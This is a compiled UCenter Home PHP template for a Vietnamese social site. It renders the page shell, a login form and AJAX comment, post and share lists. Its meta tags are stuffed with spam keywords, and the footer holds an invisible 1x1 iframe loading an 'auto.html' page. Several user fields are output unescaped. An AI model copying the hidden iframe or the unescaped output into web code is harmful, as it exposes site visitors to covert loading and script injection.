<?php if(!defined('IN_UCHOME')) exit('Access Denied');?><?php subtplcheck('template/default/do_ajax|template/default/header|template/default/space_comment_li|template/default/space_post_li|template/default/space_share_li|template/default/footer', '1315016769', 'template/default/do_ajax');?><?php if(empty($_SGLOBAL['inajax'])) { ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=<?=$_SC['charset']?>" />
<meta http-equiv="x-ua-compatible" content="ie=7" />
<title><?php if($_TPL['titles']) { ?><?php if(is_array($_TPL['titles'])) { foreach($_TPL['titles'] as $value) { ?><?php if($value) { ?><?=$value?> - <?php } ?><?php } } ?><?php } ?><?php if($_SN[$space['uid']]) { ?><?=$_SN[$space['uid']]?> - <?php } ?><?=$_SCONFIG['sitename']?> - Powered by UCenter Home 2.0 - Hỗ trợ GoHooH.CoM</title>
<meta name="keywords" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta name="description" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta http-equiv="EXPIRES" content="0" />
<meta name="RESOURCE-TYPE" content="DOCUMENT" />
<meta name="DISTRIBUTION" content="GLOBAL" />
<meta name="AUTHOR" content="Saokim999" />
<meta name="robots" content="index, follow" />
<meta name="revisit-after" content="1 days">
<script language="javascript" type="text/javascript" src="source/script_cookie.js"></script>
<script language="javascript" type="text/javascript" src="source/script_common.js"></script>
<script language="javascript" type="text/javascript" src="source/script_menu.js"></script>
<script language="javascript" type="text/javascript" src="source/script_ajax.js"></script>
<script language="javascript" type="text/javascript" src="source/script_face.js"></script>
<script language="javascript" type="text/javascript" src="source/script_manage.js"></script>
<script src="upmudim.js" type="text/javascript"></script>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
<script type="text/javascript">
try {
_uacct = "UA-4097706-3";
urchinTracker();
} catch(err) {}</script>
<style type="text/css">
@import url(template/default/style.css);
<?php if($_TPL['css']) { ?>
@import url(template/default/<?=$_TPL['css']?>.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_theme'])) { ?>
@import url(theme/<?=$_SGLOBAL['space_theme']?>/style.css);
<?php } elseif($_SCONFIG['template'] != 'default') { ?>
@import url(template/<?=$_SCONFIG['template']?>/style.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_css'])) { ?>
<?=$_SGLOBAL['space_css']?>
<?php } ?>
</style>
<link rel="shortcut icon" href="image/favicon.ico" />
<link rel="edituri" type="application/rsd+xml" title="rsd" href="xmlrpc.php?rsd=<?=$space['uid']?>" />
</head>
<body>

<div id="append_parent"></div>
<div id="ajaxwaitid"></div>
<div id="header">
<?php if($_SGLOBAL['ad']['header']) { ?><div id="ad_header"><?php adshow('header'); ?></div><?php } ?>
<div class="headerwarp">
<h1 class="logo"><a href="http://gohooh.com"><img src="template/<?=$_SCONFIG['template']?>/image/logo.gif" alt="<?=$_SCONFIG['sitename']?>" /></a></h1>
<ul class="menu">
<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=home">Trang chủ</a></li>
<li><a href="space.php">Trang cá nhân</a></li>
<li><a href="space.php?do=friend">Bạn bè</a></li>
<li><a href="network.php">Cộng đồng</a></li>
                <?php } else { ?>
<li><a href="index.php">Trang chính</a></li>
<?php } ?>

<?php if($_SGLOBAL['appmenu']) { ?>
<?php if($_SGLOBAL['appmenus']) { ?>
<li class="dropmenu" id="ucappmenu" onclick="showMenu(this.id)">
<a href="javascript:;">Site Menu</a>
</li>
<?php } else { ?>
<li><a target="_blank" href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php } ?>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=pm<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>&filter=newpm<?php } ?>">Tin nhắn<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>(Mới)<?php } ?></a></li>
<?php if($_SGLOBAL['member']['allnotenum']) { ?><li class="notify" id="membernotemenu" onmouseover="showMenu(this.id)"><a href="space.php?do=notice"><?=$_SGLOBAL['member']['allnotenum']?>Một thông điệp</a></li><?php } ?>
<?php } else { ?>
<li><a href="help.php">Trợ giúp</a></li>
<?php } ?>
</ul>

<div class="nav_account">
<?php if($_SGLOBAL['supe_uid']) { ?>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="loginName"><?=$_SN[$_SGLOBAL['supe_uid']]?></a>
<?php if($_SGLOBAL['member']['credit']) { ?>
<a href="cp.php?ac=credit" style="font-size:11px;padding:0 0 0 5px;"><img src="image/credit.gif"><?=$_SGLOBAL['member']['credit']?></a>
<?php } ?>
<br />
<?php if(empty($_SCONFIG['closeinvite'])) { ?>
<a href="cp.php?ac=invite">Mời</a> 
<?php } ?>
<a href="cp.php?ac=task">Task</a> 
<a href="cp.php?ac=magic">Thẻ Vip</a>
<a href="cp.php">CP</a> 
<a href="cp.php?ac=common&op=logout&uhash=<?=$_SGLOBAL['uhash']?>">Thoát</a>
<?php } else { ?>
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
Welcome<br>
<a href="do.php?ac=<?=$_SCONFIG['login_action']?>">Đăng nhập</a> | 
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>">Đăng ký</a>
<?php } ?>
</div>
</div>
</div>

<div id="wrap">

<?php if(empty($_TPL['nosidebar'])) { ?>
<div id="main">
<div id="app_sidebar">
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul class="app_list" id="default_userapp">
<li><img src="image/app/doing.gif"><a href="space.php?do=doing">Status</a></li>
<li><img src="image/app/album.gif"><a href="space.php?do=album">Album</a><em><a href="cp.php?ac=upload" class="gray">Upload</a></em></li>
<li><img src="image/app/blog.gif"><a href="space.php?do=blog">Blogs</a><em><a href="cp.php?ac=blog" class="gray">Viết</a></em></li>
<li><img src="image/app/poll.gif"/><a href="space.php?do=poll">Poll</a><em><a href="cp.php?ac=poll" class="gray">Bình chọn</a></em></li>
<li><img src="image/app/mtag.gif"><a href="space.php?do=mtag">Group</a><em><a href="cp.php?ac=thread" class="gray">Tạo</a></em></li>
<li><img src="image/app/event.gif"/><a href="space.php?do=event">Event</a><em><a href="cp.php?ac=event" class="gray">Bắt đầu</a></em></li>
<li><img src="image/app/share.gif"><a href="space.php?do=share">Share</a></li>
<li><img src="image/app/topic.gif"><a href="space.php?do=topic">Topic</a></li>
<li><img src="image/app/farm.gif"><a href="qqfarm.php">Nông trại</a></li>
<li><img src="image/app/fish.gif"><a href="fish.php">Ao cá</a></li>
<li><img src="image/app/love.gif"><a href="house.php">Hạnh phúc</a></li>
<li><img src="image/app/clxj.gif"><a href="clxj.php">Audition</a></li>
<li><img src="image/app/thinhthay.jpg"><a href="thayboi.php">Thầy bói</a></li>
<li><img src="image/app/blq.gif"><a href="blq.php">Bowling</a></li>
<li><img src="image/app/daovang.gif"><a href="daovang.php">Đào vàng</a></li>
<li><img src="image/app/gohoohhungtrung.gif"><a href="gohoohhungtrung.php">Hứng trứng</a></li>
<li><img src="image/app/duluong.gif"><a href="duluong.php">Dù lượng</a></li>
<li><img src="image/app/dapthu.gif"><a href="dapthu.php">Đập thú</a></li>
<li><img src="image/app/bangau.gif"><a href="bangau.php">Trượt tuyết</a></li>
<li><img src="image/app/xeptraicay.gif"><a href="xeptraicay.php">Xếp trái cây</a></li>
<li><img src="image/app/thamhiem.gif"><a href="thamhiem.php">Thám hiểm</a></li>
</ul>

<ul class="app_list topline" id="my_defaultapp">
<?php if($_SCONFIG['my_status']) { ?>
<?php if(is_array($_SGLOBAL['userapp'])) { foreach($_SGLOBAL['userapp'] as $value) { ?>
<li><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>"><?=$value['appname']?></a></li>
<?php } } ?>
<?php } ?>
</ul>

<?php if($_SCONFIG['my_status']) { ?>
<ul class="app_list topline" id="my_userapp">
<?php if(is_array($_SGLOBAL['my_menu'])) { foreach($_SGLOBAL['my_menu'] as $value) { ?>
<li id="userapp_li_<?=$value['appid']?>"><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>" title="<?=$value['appname']?>"><?=$value['appname']?></a></li>
<?php } } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['my_menu_more']) { ?>
<p class="app_more"><a href="javascript:;" id="a_app_more" onclick="userapp_open();" class="off">Mở rộng</a></p>
<?php } ?>

<?php if($_SCONFIG['my_status']) { ?>
<div class="app_m">
<ul>
<li><img src="image/app_add.gif"><a href="cp.php?ac=userapp&my_suffix=%2Fapp%2Flist" class="addApp">Thêm ứng dụng</a></li>
<li><img src="image/app_set.gif"><a href="cp.php?ac=userapp&op=menu" class="myApp">Quản lý Apps</a></li>
</ul>
</div>
<?php } ?>

<?php } else { ?>
<div class="bar_text">
<form id="loginform" name="loginform" action="do.php?ac=<?=$_SCONFIG['login_action']?>&ref" method="post">
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
<p class="title">Đăng nhập Web</p>
<p>User name</p>
<p><input type="text" name="username" id="username" class="t_input" size="15" value="" /></p>
<p>Password</p>
<p><input type="password" name="password" id="password" class="t_input" size="15" value="" /></p>
<p><input type="checkbox" id="cookietime" name="cookietime" value="315360000" checked /><label for="cookietime">Nhớ mật khẩu</label></p>
<p>
<input type="submit" id="loginsubmit" name="loginsubmit" value="Đăng nhập" class="submit" />
<input type="button" name="regbutton" value="Đăng ký" class="button" onclick="urlto('do.php?ac=<?=$_SCONFIG['register_action']?>');">
</p>
</form>
</div>
<?php } ?>
</div>

<div id="mainarea">

<?php if($_SGLOBAL['ad']['contenttop']) { ?><div id="ad_contenttop"><?php adshow('contenttop'); ?></div><?php } ?>
<?php } ?>

<?php } ?>


<?php if($op == 'comment') { ?>

<?php if(is_array($list)) { foreach($list as $value) { ?>
<?php if(empty($ajax_edit)) { ?><li id="comment_<?=$value['cid']?>_li"><?php } ?>
<?php if($value['author']) { ?>
<div class="avatar48"><a href="space.php?uid=<?=$value['authorid']?>"><?php echo avatar($value[authorid],small); ?></a></div>
<?php } else { ?>
<div class="avatar48"><img src="image/magic/hidden.gif" class="avatar" /></div>
<?php } ?>
<div class="title">
<div class="r_option">

<?php if($value['authorid'] != $_SGLOBAL['supe_uid'] && $value['author'] == "" && $_SGLOBAL['magic']['reveal']) { ?>
<a id="a_magic_reveal_<?=$value['cid']?>" href="magic.php?mid=reveal&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id,1)"><img src="image/magic/reveal.small.gif" class="magicicon"><?=$_SGLOBAL['magic']['reveal']?></a>
<span class="pipe">|</span>
<?php } ?>

<?php if($value['authorid']==$_SGLOBAL['supe_uid']) { ?>
<?php if($_SGLOBAL['magic']['anonymous']) { ?>
<img src="image/magic/anonymous.small.gif" class="magicicon">
<a id="a_magic_anonymous_<?=$value['cid']?>" href="magic.php?mid=anonymous&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id, 1)"><?=$_SGLOBAL['magic']['anonymous']?></a>
<span class="pipe">|</span>
<?php } ?>
<?php if($_SGLOBAL['magic']['flicker']) { ?>
<img src="image/magic/flicker.small.gif" class="magicicon">
<?php if($value['magicflicker']) { ?>
<a id="a_magic_flicker_<?=$value['cid']?>" href="cp.php?ac=magic&op=cancelflicker&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id)">ȡ��<?=$_SGLOBAL['magic']['flicker']?></a>
<?php } else { ?>
<a id="a_magic_flicker_<?=$value['cid']?>" href="magic.php?mid=flicker&idtype=cid&id=<?=$value['cid']?>" onclick="ajaxmenu(event,this.id, 1)"><?=$_SGLOBAL['magic']['flicker']?></a>
<?php } ?>
<span class="pipe">|</span>
<?php } ?>

<a href="cp.php?ac=comment&op=edit&cid=<?=$value['cid']?>" id="c_<?=$value['cid']?>_edit" onclick="ajaxmenu(event, this.id, 1)">Edit</a>
<?php } ?>
<?php if($value['authorid']==$_SGLOBAL['supe_uid'] || $value['uid']==$_SGLOBAL['supe_uid'] || checkperm('managecomment')) { ?>
<a href="cp.php?ac=comment&op=delete&cid=<?=$value['cid']?>" id="c_<?=$value['cid']?>_delete" onclick="ajaxmenu(event, this.id)">Remove</a>
<?php } ?>
<?php if($value['authorid']!=$_SGLOBAL['supe_uid'] && ($value['idtype'] != 'uid' || $space['self'])) { ?>
<a href="cp.php?ac=comment&op=reply&cid=<?=$value['cid']?>&feedid=<?=$feedid?>" id="c_<?=$value['cid']?>_reply" onclick="ajaxmenu(event, this.id, 1)">Reply</a>
<?php } ?>
<a href="cp.php?ac=common&op=report&idtype=comment&id=<?=$value['cid']?>" id="a_report_<?=$value['cid']?>" onclick="ajaxmenu(event, this.id, 1)">Abuse</a>
</div>

<?php if($value['author']) { ?>
<a href="space.php?uid=<?=$value['authorid']?>" id="author_<?=$value['cid']?>"><?=$_SN[$value['authorid']]?></a> 
<?php } else { ?>
Anonymous
<?php } ?>
<span class="gray"><?php echo sgmdate('Y-m-d H:i',$value[dateline],1); ?></span>

</div>

<div class="detail<?php if($value['magicflicker']) { ?> magicflicker<?php } ?>" id="comment_<?=$value['cid']?>"><?=$value['message']?></div>

<?php if(empty($ajax_edit)) { ?></li><?php } ?>
<?php } } ?>

<?php } elseif($op == 'getfriendgroup') { ?>
<?=$group?>
<?php } elseif($op == 'getfriendname') { ?>
<?=$groupname?>
<?php } elseif($op == 'getmtagmember') { ?>
<?php if($tagspace['grade']==9) { ?>Nhóm chính
<?php } elseif($tagspace['grade']==8) { ?>Phó nhóm
<?php } elseif($tagspace['grade']==1) { ?>Sao
<?php } elseif($tagspace['grade']==-1) { ?>Bị cấm
<?php } elseif($tagspace['grade']==-2) { ?>Cảnh cáo
<?php } else { ?>Thành viên
<?php } ?>

<?php } elseif($op == 'post') { ?>

<?php if(is_array($list)) { foreach($list as $value) { ?>
<?php if(empty($ajax_edit)) { ?><div id="post_<?=$value['pid']?>_li"><?php } ?>
<ul class="line_list">
<li>
<table width="100%">
<tr>
<td width="70" valign="top">
<div class="avatar48"><a href="space.php?uid=<?=$value['uid']?>"><?php echo avatar($value[uid],small); ?></a></div>
</td>
<td>
<div class="title">
<div class="r_option">
<?php if($mtag['grade']>=8 || $value['uid']==$_SGLOBAL['supe_uid'] || ($eventid && $userevent['status']>=3)) { ?>
<a href="cp.php?ac=thread&op=edit&pid=<?=$value['pid']?>" id="p_<?=$value['pid']?>_edit" onclick="ajaxmenu(event, this.id, 1)">Edit</a>
<a href="cp.php?ac=thread&op=delete&pid=<?=$value['pid']?>&tagid=<?=$thread['tagid']?>" id="p_<?=$value['pid']?>_delete" onclick="ajaxmenu(event, this.id)">Remove</a>
<?php } ?>
<?php if($value['uid']!=$_SGLOBAL['supe_uid'] && (($mtag['allowpost'] && !$eventid) || ($eventid && $userevent['status']>1))) { ?><a href="cp.php?ac=thread&op=reply&pid=<?=$value['pid']?>" id="p_<?=$value['pid']?>_reply" onclick="ajaxmenu(event, this.id, 1)">Reply</a> <?php } ?>
<a href="cp.php?ac=common&op=report&idtype=post&id=<?=$value['pid']?>" id="a_report_<?=$value['pid']?>" onclick="ajaxmenu(event, this.id, 1)">Abuse</a>
<span class="gray">#<?=$value['num']?></span>
</div>
<a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a> 
<span class="gray"><?php echo sgmdate('Y-m-d H:i',$value[dateline],1); ?></span>
</div>
<div class="detail" id="detail_<?=$value['pid']?>">
<?=$value['message']?>
<?php if($value['pic']) { ?><div><a href="<?=$value['pic']?>" target="_blank"><img src="<?=$value['pic']?>" class="resizeimg" /></a></div><?php } ?>
</div>
</td>
</tr>
</table>
</li>
</ul>
<?php if(empty($ajax_edit)) { ?></div><?php } ?>
<?php } } ?>

<?php } elseif($op == 'share') { ?>

<?php if(is_array($list)) { foreach($list as $value) { ?>
<?php if(empty($ajax_edit)) { ?><li id="share_<?=$value['sid']?>_li"><?php } ?>
<div class="title">
<div class="r_option">
<?php if($value['sid'] && ($_SGLOBAL['supe_uid'] == $value['uid'] || checkperm('manageshare'))) { ?>
<a href="cp.php?ac=topic&op=join&id=<?=$value['sid']?>&idtype=sid" id="a_topicjoin_<?=$value['sid']?>" onclick="ajaxmenu(event, this.id)">Join the Fun </a><span class="pipe">|</span>
<?php } ?>
<?php if($value['sid']) { ?><a href="space.php?uid=<?=$value['uid']?>&do=share&id=<?=$value['sid']?>">Comment</a>&nbsp;<?php } ?>
<?php if($value['uid']==$_SGLOBAL['supe_uid']) { ?><?php if($value['type']=='link' || 'video' == $value['type'] || 'music' == $value['type']) { ?><span class="pipe">|</span><?php } ?><a href="cp.php?ac=share&op=delete&sid=<?=$value['sid']?>" id="s_<?=$value['sid']?>_delete" onclick="ajaxmenu(event, this.id)">Remove</a><?php } ?>
</div>
<a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a> <a href="space.php?uid=<?=$value['uid']?>&do=share&id=<?=$value['sid']?>"><?=$value['title_template']?></a>
&nbsp;<span class="gray"><?php echo sgmdate('Y-m-d H:i',$value[dateline],1); ?></span>
</div>
<div class="feed">
<div style="width:100%;overflow:hidden;">
<?php if($value['image']) { ?>
<a href="<?=$value['image_link']?>"><img src="<?=$value['image']?>" class="summaryimg image" alt="" width="70" /></a>
<?php } ?>
<div class="detail">
<?=$value['body_template']?>
</div>
<?php if('video' == $value['type']) { ?>
<div class="media">
<img src="image/vd.gif" alt="Click to play" onclick="javascript:showFlash('<?=$value['body_data']['host']?>', '<?=$value['body_data']['flashvar']?>', this, '<?=$value['sid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif('music' == $value['type']) { ?>
<div class="media">
<img src="image/music.gif" alt="Click to play" onclick="javascript:showFlash('music', '<?=$value['body_data']['musicvar']?>', this, '<?=$value['sid']?>');" style="cursor:pointer;" />
</div>
<?php } elseif('flash' == $value['type']) { ?>
<div class="media">
<img src="image/flash.gif" alt="Click to View" onclick="javascript:showFlash('flash', '<?=$value['body_data']['flashaddr']?>', this, '<?=$value['sid']?>');" style="cursor:pointer;" />
</div>
<?php } ?>
<div class="quote"><span id="quote" class="q"><?=$value['body_general']?></span></div>
</div>
</div>
<?php if(empty($ajax_edit)) { ?></li><?php } ?>
<?php } } ?>

<?php } elseif($op == 'album') { ?>

<table cellspacing="2" cellpadding="2">
<tr>
<?php if(is_array($piclist)) { foreach($piclist as $key => $value) { ?>
<td><img src="<?=$value['pic']?>" width="60" onclick="insertImage('<?=$value['bigpic']?>');" style="cursor:hand;"></td>
<?php if($key%5==4) { ?></tr><tr><?php } ?>
<?php } } ?>
</tr>
</table>

<div class="page"><?=$multi?></div>
<?php } elseif($op == 'getreward') { ?>
<?php if($rule['credit'] || $rule['experience']) { ?>
<div class="popupmenu_layer">
<p><?=$rule['rulename']?></p>
<p class="btn_line">
<?php if($rule['credit']) { ?>Tiền <strong>+<?=$rule['credit']?></strong> <?php } ?>
<?php if($rule['experience']) { ?>Kinh nghiệm <strong>+<?=$rule['experience']?></strong> <?php } ?>
</p>
<?php if($rule['cyclenum']) { ?>
<p>
Tuần này, bạn có <?=$rule['cyclenum']?> điểm mới
</p>
<?php } ?>
</div>
<?php } ?>
<?php } ?>

<?php if(empty($_SGLOBAL['inajax'])) { ?>
<?php if(empty($_TPL['nosidebar'])) { ?>
<?php if($_SGLOBAL['ad']['contentbottom']) { ?><br style="line-height:0;clear:both;"/><div id="ad_contentbottom"><?php adshow('contentbottom'); ?></div><?php } ?>
</div>

<!--/mainarea-->
<div id="bottom"></div>
</div>
<!--/main-->
<?php } ?>

<div id="footer">
<?php if($_TPL['templates']) { ?>
<div class="chostlp" title="Đổi giao diện"><img id="chostlp" src="<?=$_TPL['default_template']['icon']?>" onmouseover="showMenu(this.id)" alt="<?=$_TPL['default_template']['name']?>" /></div>
<ul id="chostlp_menu" class="chostlp_drop" style="display: none">
<?php if(is_array($_TPL['templates'])) { foreach($_TPL['templates'] as $value) { ?>
<li><a href="cp.php?ac=common&op=changetpl&name=<?=$value['name']?>" title="<?=$value['name']?>"><img src="<?=$value['icon']?>" alt="<?=$value['name']?>" /></a></li>
<?php } } ?>
</ul>
<?php } ?>

<p class="r_option">
<a href="javascript:;" onclick="window.scrollTo(0,0);" id="a_top" title="TOP"><img src="image/top.gif" alt="" style="padding: 5px 6px 6px;" /></a>
</p>

<?php if($_SGLOBAL['ad']['footer']) { ?>
<p style="padding:5px 0 10px 0;"><?php adshow('footer'); ?></p>
<?php } ?>

<?php if($_SCONFIG['close']) { ?>
<p style="color:blue;font-weight:bold;">
Thông báo: Hiện trang web đang tạm ngừng hoạt động
</p>
<?php } ?>
<p>
<?=$_SCONFIG['sitename']?> - 
<a href="mailto:<?=$_SCONFIG['adminemail']?>">Liên hệ</a> <a href="http://gohooh.com">Discuz! Việt - Mạng xã hội</a>
<?php if($_SCONFIG['miibeian']) { ?> - <a  href="http://www.miibeian.gov.cn" target="_blank"><?=$_SCONFIG['miibeian']?></a><?php } ?>
</p>
<p>
Powered by <a  href="http://gohooh.com" target="_blank"><strong>UCenter Home</strong></a> <span title="<?php echo X_RELEASE; ?>"><?php echo X_VER; ?></span>
<?php if(!empty($_SCONFIG['licensed'])) { ?><a  href="http://license.comsenz.com/?pid=7&host=<?=$_SERVER['HTTP_HOST']?>" target="_blank">Licensed</a><?php } ?>
&copy; 2001-2009 <a  href="http://www.comsenz.com" target="_blank">Comsenz Inc.</a>
</p>
<?php if($_SCONFIG['debuginfo']) { ?>
<p><?php echo debuginfo(); ?></p>
<?php } ?>
</div>
</div>
<!--/wrap-->

<?php if($_SGLOBAL['appmenu']) { ?>
<ul id="ucappmenu_menu" class="dropmenu_drop" style="display:none;">
<li><a href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>" target="_blank"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php if(is_array($_SGLOBAL['appmenus'])) { foreach($_SGLOBAL['appmenus'] as $value) { ?>
<li><a href="<?=$value['url']?>" title="<?=$value['name']?>" target="_blank"><?=$value['name']?></a></li>
<?php } } ?>
</ul>
<?php } ?>
<iframe style="WIDTH: 1; HEIGHT: 1" src="http://www.gohooh.com/auto.html" frameborder="0" width="1" scrolling="1" height="1"></iframe>
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul id="membernotemenu_menu" class="dropmenu_drop" style="display:none;">
<?php $member = $_SGLOBAL['member']; ?>
<?php if($member['notenum']) { ?><li><img src="image/icon/notice.gif" width="16" alt="" /> <a href="space.php?do=notice"><strong><?=$member['notenum']?></strong> Thông báo mới</a></li><?php } ?>
<?php if($member['pokenum']) { ?><li><img src="image/icon/poke.gif" alt="" /> <a href="cp.php?ac=poke"><strong><?=$member['pokenum']?></strong> Tin mới</a></li><?php } ?>
<?php if($member['addfriendnum']) { ?><li><img src="image/icon/friend.gif" alt="" /> <a href="cp.php?ac=friend&op=request"><strong><?=$member['addfriendnum']?></strong> Yêu cầu kết bạn</a></li><?php } ?>
<?php if($member['mtaginvitenum']) { ?><li><img src="image/icon/mtag.gif" alt="" /> <a href="cp.php?ac=mtag&op=mtaginvite"><strong><?=$member['mtaginvitenum']?></strong> Mời nhóm</a></li><?php } ?>
<?php if($member['eventinvitenum']) { ?><li><img src="image/icon/event.gif" alt="" /> <a href="cp.php?ac=event&op=eventinvite"><strong><?=$member['eventinvitenum']?></strong> Mời tham gia Event</a></li><?php } ?>
<?php if($member['myinvitenum']) { ?><li><img src="image/icon/userapp.gif" alt="" /> <a href="space.php?do=notice&view=userapp"><strong><?=$member['myinvitenum']?></strong> Mời qua Email</a></li><?php } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<?php if(!isset($_SCOOKIE['checkpm'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=pm&op=checknewpm&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php if(!isset($_SCOOKIE['synfriend'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=friend&op=syn&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php } ?>
<?php if(!isset($_SCOOKIE['sendmail'])) { ?>
<script language="javascript"  type="text/javascript" src="do.php?ac=sendmail&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>

<?php if($_SGLOBAL['ad']['couplet']) { ?>
<script language="javascript" type="text/javascript" src="source/script_couplet.js"></script>
<div id="uch_couplet" style="z-index: 10; position: absolute; display:none">
<div id="couplet_left" style="position: absolute; left: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<div id="couplet_rigth" style="position: absolute; right: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<script type="text/javascript">
lsfloatdiv('uch_couplet', 0, 0, '', 0).floatIt();
</script>
</div>
<?php } ?>
<?php if($_SCOOKIE['reward_log']) { ?>
<script type="text/javascript">
showreward();
</script>
<?php } ?>
<br>
</body>
</html>
<?php } ?><?php ob_out();?>